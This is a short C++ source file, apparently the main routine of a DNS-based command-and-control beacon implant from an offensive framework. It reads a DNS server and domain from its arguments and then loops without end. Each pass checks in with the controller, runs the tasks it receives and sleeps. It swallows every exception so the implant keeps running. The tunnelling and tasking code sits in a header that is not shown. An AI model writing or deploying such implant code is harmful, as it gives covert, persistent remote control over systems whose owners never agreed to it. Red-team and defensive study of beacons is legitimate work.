#include "BeaconDns.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string dnsServer = "";
	if(argc > 1)
		dnsServer = argv[1];

	std::string domain = "";
	if (argc > 2)
		domain = argv[2];

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconDns>(dnsServer, domain);

	bool exit = false;
	while (!exit)
	{
		try 
		{
			beacon->checkIn();

			exit = beacon->runTasks();
			
			beacon->sleep();
		}
		catch(const std::exception& ex)
		{
			std::cout << "Exeption " << std::endl;
			// std::cout << "Exeption " << ex.what() << std::endl;
			beacon->sleep();
		}
		catch (...) 
		{
			// std::cout << "Exeption" << std::endl;
			beacon->sleep();
		}
	}

	beacon->checkIn();
}